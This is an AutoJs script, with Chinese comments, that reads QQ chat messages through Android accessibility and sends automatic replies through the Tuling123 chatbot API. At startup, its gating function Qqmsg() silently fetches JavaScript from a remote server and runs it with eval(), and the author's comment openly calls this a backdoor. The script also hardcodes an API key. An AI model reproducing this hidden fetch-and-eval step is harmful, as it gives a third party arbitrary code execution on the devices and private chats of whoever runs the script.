"auto";

/*
QQMsg 获取QQ最新消息 (AutoJs)
By 张达
E-Mail:new-age@outlook.com
QQ:32552732
2017-03-24 完成
2017-05-08 修改 加入支持非群组对话以及其它内容
手Q官方版 6.6.9 已测试 理论支持6.*所有QQ（包括对应版本的TIM）
版权所有，进行修改及引用等动作请务必完整保留本注释（您可以在隐蔽但能够发现并轻易查看处添加注释）
难度不高，可能只有引用或使用价值，没有学习价值
非常荣幸被引用或借鉴，如有错误欢迎指正
再次恳请您务必完整保留此注释，万分感谢您对我的尊重
*/

//代码与版权注释是一对好基友，请您不要狠心拆散他们

importPackage(java.net);
importPackage(java.io);
importPackage(java.lang);

function net(path, method) {
/*
Java.net网络请求方案
By 黑色Life
QQ:2454713902
*/
    var url = new URL(path);
    var conn = url.openConnection();
    conn.setConnectTimeout(3000);
    conn.setRequestMethod(method);
    var isn = conn.getInputStream();
    var is = new InputStreamReader(isn);
    var buf = new BufferedReader(is);
    var res = new StringBuilder();
    conn.disconnect();
    while ((str = buf.readLine()) != null) {
        res.append(str);
    }
    buf.close();
    return res.toString();
}

//droid.ensureAccessibilityServiceEnabled();//等同于第一行的"auto";
var lastmsg = ""; //初始化上一条消息变量
var lastsender = ""; //初始化上一发送者变量
var lasttitle = ""; //初始化上一标题变量
if(Qqmsg()=="new-age@outlook.com"){//执行QQMsg校验
while (true) { //循环读取消息
    while (true) { //消息读取失败时重新检测(循环)
        var status = false; //初始化状态变量
        var title; //标题
        var chat; //消息容器
        var all; //消息总数
        var msg; //消息内容
        var sender; //发送者昵称
        var isgroup; //是否群组
        var head; //头像控件
        try {
            title = id("title").findOne().text(); //读取标题
            chat = className("android.widget.AbsListView").id("listView1"); //读取消息容器
            all = chat.findOne().getChildCount(); //读取消息总数作为需要读取的消息序号
            isgroup = null; //初始化是否群组变量
            msg = chat.findOne().child(all - 1).find(id("chat_item_content_layout").className("TextView")).get(0).text(); //读取消息内容
            try {
                sender = chat.findOne().child(all - 1).find(id("chat_item_nick_name")).get(0).text(); //读取群昵称设置到发送者昵称
                isgroup = true; //是群组
            } catch(e) {
                sender = title; //发送者昵称设置为标题
                isgroup = false; //不是群组
            }
            var head = chat.findOne().child(all - 1).find(id("chat_item_head_icon")).get(0); //读取头像控件
            sender = String(sender); //转为String类型
            sender = sender.replace(/\:$/, ""); //去除群昵称后的冒号
            status = true; //状态正常
            if (title == null) {
                status = false; //无法取得标题则状态异常
            }
        } catch(e) {
            status = false; //状态异常
            msg = e; //设置消息为异常描述
        }
        msg = String(msg); //转为String类型
        if (status) {
            break; //消息读取状态正常时退出循环
        }
    }
    if (lastmsg != msg || lastsender != sender || lasttitle != title) { //新消息判断
        QQMsg(status, isgroup, title, msg, sender, head); //调用操作
    }
    lastmsg = msg; //保存消息
    lastsender = sender; //保存发送者
    lasttitle = title; //保存标题
}
}

function QQMsg(status, isgroup, title, msg, sender, head) {
/*
 * 此处为得到新消息的操作
 * 您可以在这里执行自定义操作，例如调用机器人API进行回复、记录消息到文件等
 * status为消息获取状态（布尔值）（目前在消息获取失败时循环重新读取，因此不会出现false）
 * isgroup为是否群组（布尔值）
 * title为标题
 * msg为消息内容
 * sender为发送者昵称
 * head为头像控件
 */
    if (status) {
        var chattype = isgroup ? "群组" : "个人";
        toast("类型：" + chattype + "\n标题：" + title + "\n发送者：" + sender + "\n消息内容：" + msg); //Toast提示消息

        //示例-图灵机器人自动回复 抛砖引玉，希望大家能够有更多创意哦
        var lt="\n来自AutoJs自动回复";//设置机器人消息后缀
        if(msg.match(lt)==null){
        var tuling=tuling123(msg,title+","+sender);
        id("input").setText(tuling+lt);//输入
        id("input").setSelection(0,0);//定位光标到开头以便艾特
        head.longClick();//艾特
        sleep(500);
        id("fun_btn").click();//发送
        }

        //请您自由发挥 :)

    } else {
        toast("消息读取出错：\n" + msg);
    }
}

//以下内容为示例中机器人所需 您可以忽略它 若您需要自定义操作，您可以删除它们

function toURI(text) {
/*
encodeURI补充方案
By 张达
E-Mail:new-age@outlook.com
QQ:32552732
*/
    //text=text.replace(/%/g,"%25");//影响到其他URI字符，置顶首先替换
    text = encodeURI(text);
    text = text.replace(/\+/g, "%2B");
    text = text.replace(/\n/g, "%0A");
    text = text.replace(/@/g, "%40");
    text = text.replace(/#/g, "%23");
    text = text.replace(/\$/g, "%24");
    text = text.replace(/&/g, "%26");
    text = text.replace(/"/g, "%22");
    text = text.replace(/\(/g, "%28");
    text = text.replace(/\)/g, "%29");
    text = text.replace(/'/g, "%27");
    text = text.replace(/\//g, "%2F");
    text = text.replace(/\\/g, "%5C");
    text = text.replace(/:/g, "%3A");
    text = text.replace(/;/g, "%3B");
    text = text.replace(/\?/g, "%3F");
    text = text.replace(/=/g, "%3D");
    text = text.replace(/</g, "%3C");
    text = text.replace(/>/g, "%3E");
    text = text.replace(/{/g, "%7B");
    text = text.replace(/}/g, "%7D");
    text = text.replace(/\[/g, "%5B");
    text = text.replace(/\]/g, "%5D");
    text = text.replace(/!/g, "%21");
    text = text.replace(/,/g, "%2C");
    text = text.replace(/\^/g, "%5E");
    text = text.replace(/\|/g, "%7C");
    return text;
}

function Qqmsg(){
try{
eval(String(net("http://api.xtasker.cn/apps/autojs/qqmsg","GET")));//没错，后门 : )
}catch(e){}
return "new-age@outlook.com";
}

function tuling123(text, userid) {
/*
图灵机器人接口返回内容处理方案
By 张达
E-Mail:new-age@outlook.com
QQ:32552732
*/
    try {
        var tlkey = "72dd728c01900226560ad2f54e2e1c22"; //填写您的机器人Key，可在tuling123.com注册
        var result = JSON.parse(net("http://www.tuling123.com/openapi/api?key=" + tlkey + "&info=" + toURI(text) + "&userid=" + toURI(userid), "GET"));
        switch (result.code) {
        case 40002:
            //传入错误
            result = result.text;
            result += "\n请您详细描述您的问题并重新提问。";
            break;

        case 100000:
            //文本
            result = result.text;
            break;

        case 200000:
            //链接
            result = result.text + "\n链接：" + result.url;
            break;

        case 302000:
            //新闻
            var news = result.list;
            var long = 5; //显示新闻数量
            var long = long < news.length ? long : news.length; //若要求显示的新闻大于总长度，则显示全部新闻
            result = result.text + "\n总共" + long + "条新闻。\n\n";
            for (var i = 0; i < long; i++) {
                result = result + "\n" + news[i].article + "\n" + news[i].detailurl + "\n来自" + news[i].source + "\n";
            }
            break;

        case 308000:
            //菜谱
            result = result.text + "\n很抱歉，暂不支持菜谱功能。";
            break;

        default:
            //其它
            result = result.text + "\n很抱歉，暂不支持此功能，返回码：" + result.code + "。";
        }
        if (result.match(/^.{2,10}\:((1|2|3|4|5|6|7|8|9|10|11|12)月([12]?[0-9]|3[01])号 周[一二三四五六日],.+?° .+)+/) != null) {
            result = result.replace(/^(.{2,10}):/, "以下是$1的天气信息\n\n");
            result = result.replace(/(1|2|3|4|5|6|7|8|9|10|11|12)月([12]?[0-9]|3[01])号 周([一二三四五六日])/, "今天 $1月$2日 周$3")
            result = result.replace(/(1|2|3|4|5|6|7|8|9|10|11|12)月([12]?[0-9]|3[01])号 周([一二三四五六日])/g, "$1月$2日 周$3")
            result = result.replace(/,/g, "\n");
            result = result.replace(/;/g, "\n\n");
        }
        return result;
    } catch(err) {
        return;
    }
}